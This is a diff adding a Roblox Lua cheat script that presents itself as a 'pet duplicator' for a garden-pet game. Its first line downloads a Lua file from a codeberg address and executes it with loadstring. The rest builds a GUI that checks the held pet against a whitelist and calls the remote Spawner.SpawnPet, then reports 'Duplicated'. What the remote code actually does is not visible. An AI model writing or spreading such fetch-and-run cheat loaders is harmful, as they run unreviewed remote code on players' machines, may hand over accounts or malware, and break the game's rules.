@@ -1,0 +1,296 @@
+local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
+Spawner.GetPets()
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local TweenService = game:GetService("TweenService")
+
+local LocalPlayer = Players.LocalPlayer
+repeat task.wait() until LocalPlayer and LocalPlayer.Character
+
+-- GUI Setup
+local gui = Instance.new("ScreenGui", CoreGui)
+gui.Name = "PetDuplicatorGUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Main Frame
+local main = Instance.new("Frame", gui)
+main.Size = UDim2.new(0, 260, 0, 150)
+main.Position = UDim2.new(0.5, -130, 0.5, -75)
+main.BackgroundColor3 = Color3.fromRGB(24, 34, 38)
+main.Active = true
+main.Draggable = true
+Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
+local stroke = Instance.new("UIStroke", main)
+stroke.Color = Color3.fromRGB(80, 200, 180)
+stroke.Thickness = 2
+
+-- Header
+local header = Instance.new("Frame", main)
+header.Size = UDim2.new(1, 0, 0, 35)
+header.BackgroundColor3 = Color3.fromRGB(28, 44, 48)
+Instance.new("UICorner", header)
+
+local title = Instance.new("TextLabel", header)
+title.Size = UDim2.new(1, -40, 1, 0)
+title.Position = UDim2.new(0, 10, 0, 0)
+title.Text = "PET DUPLICATOR"
+title.TextColor3 = Color3.fromRGB(220, 240, 235)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 14
+title.BackgroundTransparency = 1
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+local closeBtn = Instance.new("TextButton", header)
+closeBtn.Text = "X"
+closeBtn.Size = UDim2.new(0, 20, 0, 20)
+closeBtn.Position = UDim2.new(1, -30, 0, 8)
+closeBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 180)
+closeBtn.TextColor3 = Color3.fromRGB(24, 34, 38)
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 13
+Instance.new("UICorner", closeBtn)
+closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+-- Info Button
+local infoBtn = Instance.new("TextButton", header)
+infoBtn.Size = UDim2.new(0, 20, 0, 20)
+infoBtn.Position = UDim2.new(1, -55, 0, 8)
+infoBtn.BackgroundColor3 = Color3.fromRGB(120, 220, 210)
+infoBtn.Text = "?"
+infoBtn.Font = Enum.Font.GothamBold
+infoBtn.TextColor3 = Color3.fromRGB(24, 34, 38)
+infoBtn.TextSize = 13
+Instance.new("UICorner", infoBtn)
+infoBtn.MouseEnter:Connect(function()
+    infoBtn.BackgroundColor3 = Color3.fromRGB(180, 240, 230)
+end)
+infoBtn.MouseLeave:Connect(function()
+    infoBtn.BackgroundColor3 = Color3.fromRGB(120, 220, 210)
+end)
+
+-- Info Modal
+infoBtn.MouseButton1Click:Connect(function()
+    if gui:FindFirstChild("InfoModal") then return end
+    local blur = Instance.new("BlurEffect")
+    blur.Size = 16
+    blur.Name = "ModalBlur"
+    blur.Parent = game:GetService("Lighting")
+    local modal = Instance.new("Frame", gui)
+    modal.Name = "InfoModal"
+    modal.Size = UDim2.new(0, 320, 0, 180)
+    modal.Position = UDim2.new(0.5, -160, 0.5, -90)
+    modal.BackgroundColor3 = Color3.fromRGB(28, 44, 48)
+    modal.Active = true
+    modal.ZIndex = 30
+    Instance.new("UICorner", modal).CornerRadius = UDim.new(0, 8)
+    local modalStroke = Instance.new("UIStroke", modal)
+    modalStroke.Color = Color3.fromRGB(80, 200, 180)
+    modalStroke.Thickness = 2
+    local titleBar = Instance.new("Frame", modal)
+    titleBar.Size = UDim2.new(1, 0, 0, 22)
+    titleBar.BackgroundColor3 = Color3.fromRGB(24, 34, 38)
+    Instance.new("UICorner", titleBar)
+    local titleLabel = Instance.new("TextLabel", titleBar)
+    titleLabel.Size = UDim2.new(1, -24, 1, 0)
+    titleLabel.Position = UDim2.new(0, 8, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "PET DUPLICATOR INFO"
+    titleLabel.TextColor3 = Color3.fromRGB(220, 240, 235)
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextSize = 13
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    local closeBtn2 = Instance.new("TextButton", titleBar)
+    closeBtn2.Size = UDim2.new(0, 18, 0, 18)
+    closeBtn2.Position = UDim2.new(1, -20, 0, 2)
+    closeBtn2.BackgroundColor3 = Color3.fromRGB(80, 200, 180)
+    closeBtn2.TextColor3 = Color3.fromRGB(24, 34, 38)
+    closeBtn2.Text = "✖"
+    closeBtn2.Font = Enum.Font.GothamBold
+    closeBtn2.TextSize = 13
+    Instance.new("UICorner", closeBtn2)
+    closeBtn2.MouseEnter:Connect(function()
+        closeBtn2.BackgroundColor3 = Color3.fromRGB(120, 220, 210)
+    end)
+    closeBtn2.MouseLeave:Connect(function()
+        closeBtn2.BackgroundColor3 = Color3.fromRGB(80, 200, 180)
+    end)
+    closeBtn2.MouseButton1Click:Connect(function()
+        if blur then blur:Destroy() end
+        if modal then modal:Destroy() end
+    end)
+    local infoLabel = Instance.new("TextLabel", modal)
+    infoLabel.Size = UDim2.new(1, -16, 1, -30)
+    infoLabel.Position = UDim2.new(0, 8, 0, 26)
+    infoLabel.BackgroundTransparency = 1
+    infoLabel.TextColor3 = Color3.fromRGB(220, 240, 235)
+    infoLabel.Text = "✅ Valid pets to duplicate are: Raccoon, T-Rex, Butterfly, Dragonfly, Mimic Octopus, Queen Bee, Disco Bee, Spinosaurus, Fennec Fox and Kitsune.\n\n⚠️ PETS WITH MUTATIONS ARE\nNOT ALLOWED TO DUPLICATE\n\n✅ Equip a valid pet and \npress DUPLICATE to duplicate that pet."
+    infoLabel.TextWrapped = true
+    infoLabel.Font = Enum.Font.Gotham
+    infoLabel.TextSize = 12
+    infoLabel.ZIndex = 31
+    infoLabel.TextStrokeTransparency = 0.5
+end)
+
+-- Page Frame
+local page = Instance.new("Frame", main)
+page.Size = UDim2.new(1, -20, 1, -50)
+page.Position = UDim2.new(0, 10, 0, 40)
+page.BackgroundColor3 = Color3.fromRGB(20, 28, 32)
+Instance.new("UICorner", page)
+
+-- Success Message Label (created below title)
+local successMsgLabel = Instance.new("TextLabel", page)
+successMsgLabel.Size = UDim2.new(1, -20, 0, 20)
+successMsgLabel.Position = UDim2.new(0, 10, 0, 5)
+successMsgLabel.Text = ""
+successMsgLabel.TextColor3 = Color3.fromRGB(80, 220, 80)
+successMsgLabel.Font = Enum.Font.GothamBold
+successMsgLabel.TextSize = 12
+successMsgLabel.BackgroundTransparency = 1
+successMsgLabel.TextXAlignment = Enum.TextXAlignment.Center
+successMsgLabel.Visible = false
+
+-- Item Name Background Frame (below success message)
+local itemNameBG = Instance.new("Frame", page)
+itemNameBG.Size = UDim2.new(1, -20, 0, 30)
+itemNameBG.Position = UDim2.new(0, 10, 0, 30)
+itemNameBG.BackgroundColor3 = Color3.fromRGB(32, 48, 52)
+itemNameBG.BackgroundTransparency = 0.15
+Instance.new("UICorner", itemNameBG).CornerRadius = UDim.new(0, 6)
+local itemNameStroke = Instance.new("UIStroke", itemNameBG)
+itemNameStroke.Color = Color3.fromRGB(80, 200, 180)
+itemNameStroke.Thickness = 1
+
+-- Item Name Label (parented to background)
+local itemNameLabel = Instance.new("TextLabel", itemNameBG)
+itemNameLabel.Size = UDim2.new(1, 0, 1, 0)
+itemNameLabel.Position = UDim2.new(0, 0, 0, 0)
+itemNameLabel.Text = "You're not holding an item"
+itemNameLabel.TextColor3 = Color3.fromRGB(220, 240, 235)
+itemNameLabel.Font = Enum.Font.GothamBold
+itemNameLabel.TextSize = 13
+itemNameLabel.BackgroundTransparency = 1
+itemNameLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Duplicate Button (centered below item name background)
+local duplicateBtn = Instance.new("TextButton", page)
+duplicateBtn.Text = "DUPLICATE"
+duplicateBtn.Size = UDim2.new(0, 220, 0, 28) -- fixed width for centering
+duplicateBtn.AnchorPoint = Vector2.new(0.5, 0)
+duplicateBtn.Position = UDim2.new(0.5, 0, 0, 65)
+duplicateBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 180)
+duplicateBtn.TextColor3 = Color3.fromRGB(24, 34, 38)
+duplicateBtn.Font = Enum.Font.GothamBold
+duplicateBtn.TextSize = 14
+Instance.new("UICorner", duplicateBtn)
+duplicateBtn.Active = false
+duplicateBtn.TextTransparency = 0.5
+
+-- Whitelist of valid pets
+local WHITELISTED_PETS = {
+    ["Raccoon"] = true,
+    ["T-Rex"] = true,
+    ["Butterfly"] = true,
+    ["Dragonfly"] = true,
+    ["Mimic Octopus"] = true,
+    ["Queen Bee"] = true,
+    ["Disco Bee"] = true,
+    ["Spinosaurus"] = true,
+    ["Fennec Fox"] = true,
+    ["Kitsune"] = true,
+}
+
+-- Helper to get base pet name (removes mutations and trims)
+local function getBasePetName(petName)
+    local PET_MUTATIONS = {
+        "Shiny", "Inverted", "Windy", "Frozen", "Golden", "Tiny", "Mega", "IronSkin", "Radiant", "Shocked", "Rainbow", "Ascended", "Corrupted"
+    }
+    for _, mutation in ipairs(PET_MUTATIONS) do
+        if petName:sub(1, #mutation + 1) == mutation .. " " then
+            return petName:sub(#mutation + 2)
+        end
+    end
+    return petName
+end
+
+-- Helper to parse name, kg, age from item name
+local function parsePetInfo(name)
+    -- Example: 'Raccoon [1:00 KG] [Age 2]'
+    local base = name:match("^([^%[]+)") or ""
+    local kg = name:match("%[(.-) KG%]")
+    local age = name:match("%[Age (%d+)%]")
+    base = base:gsub("%s+$", "")
+    kg = tonumber(kg and kg:gsub(":", ".")) or 1
+    age = tonumber(age) or 1
+    return base, kg, age
+end
+
+-- Replace monitorTool with whitelist logic
+local function monitorTool()
+    task.spawn(function()
+        while true do
+            local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+            local tool
+            for _, c in ipairs(char:GetChildren()) do
+                if c:IsA("Tool") then
+                    tool = c
+                    break
+                end
+            end
+            if tool then
+                local base = getBasePetName((tool.Name:match("^([^%[]+)") or ""):gsub("%s+$", ""))
+                local hasKG = tool.Name:find("KG%]")
+                local hasAge = tool.Name:find("Age ")
+                if WHITELISTED_PETS[base] and hasKG and hasAge then
+                    itemNameLabel.Text = tool.Name
+                    duplicateBtn.Active = true
+                    duplicateBtn.TextTransparency = 0
+                elseif hasKG and hasAge then
+                    itemNameLabel.Text = "Please equip a valid pet"
+                    duplicateBtn.Active = false
+                    duplicateBtn.TextTransparency = 0.5
+                else
+                    itemNameLabel.Text = "You're not holding a pet"
+                    duplicateBtn.Active = false
+                    duplicateBtn.TextTransparency = 0.5
+                end
+            else
+                itemNameLabel.Text = "You're not holding a pet"
+                duplicateBtn.Active = false
+                duplicateBtn.TextTransparency = 0.5
+            end
+            task.wait(0.2)
+        end
+    end)
+end
+
+monitorTool()
+
+duplicateBtn.MouseButton1Click:Connect(function()
+    if not duplicateBtn.Active then return end
+    local char = LocalPlayer.Character
+    local tool
+    for _, c in ipairs(char:GetChildren()) do
+        if c:IsA("Tool") then
+            tool = c
+            break
+        end
+    end
+    if tool then
+        local base, kg, age = parsePetInfo(tool.Name)
+        base = getBasePetName(base)
+        if not (WHITELISTED_PETS[base] and tool.Name:find("KG%]") and tool.Name:find("Age ")) then
+            return
+        end
+        -- Instantly duplicate the pet and show a quick success message
+        successMsgLabel.Text = "Duplicated: " .. base .. "!"
+        successMsgLabel.Visible = true
+        Spawner.SpawnPet(base, kg, age)
+        task.spawn(function()
+            task.wait(2)
+            if successMsgLabel and successMsgLabel.Parent then successMsgLabel.Visible = false end
+        end)
+    end
+end) 
